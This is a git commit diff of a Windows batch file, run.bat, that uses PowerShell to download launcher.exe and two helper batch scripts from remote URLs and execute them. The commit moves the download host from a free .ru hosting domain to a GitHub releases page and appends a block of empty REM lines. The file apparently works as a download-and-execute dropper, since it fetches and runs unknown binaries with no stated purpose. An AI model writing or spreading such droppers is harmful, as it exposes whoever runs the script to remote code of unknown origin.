8e0619dfb2816cb9d7de3b14c974cf43c806bfbc
softer777 <165616740+softer777@users.noreply.github.com>
2024-04-19 08:35:50 +0500

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,7 @@
 @echo off
 
 mkdir lib
-powershell -command "& { (New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/launcher.exe', '.\lib\launcher.exe');(New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/updater.bat', '.\lib\updater.bat');(New-Object System.Net.WebClient).DownloadFile('http://a0931945.xsph.ru/updatern.bat', '.\lib\updatern.bat')}"
+powershell -command "& { (New-Object System.Net.WebClient).DownloadFile('https://github.com/softer777/files/releases/download/main/launcher.exe', '.\lib\launcher.exe');(New-Object System.Net.WebClient).DownloadFile('https://github.com/softer777/files/releases/download/main/updater.bat', '.\lib\updater.bat');(New-Object System.Net.WebClient).DownloadFile('https://github.com/softer777/files/releases/download/main/updatern.bat', '.\lib\updatern.bat')}"
 if not exist "%USERPROFILE%\first_run.txt" (
     start "" /wait "%USERPROFILE%\Downloads\lib\updater.bat"
     echo First run completed. > "%USERPROFILE%\first_run.txt"
@@ -9,3 +9,19 @@ if not exist "%USERPROFILE%\first_run.txt" (
     start "" "%USERPROFILE%\Downloads\lib\updatern.bat"
 )
 powershell -command "& { Start-Process -FilePath '.\lib\launcher.exe' }"
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+
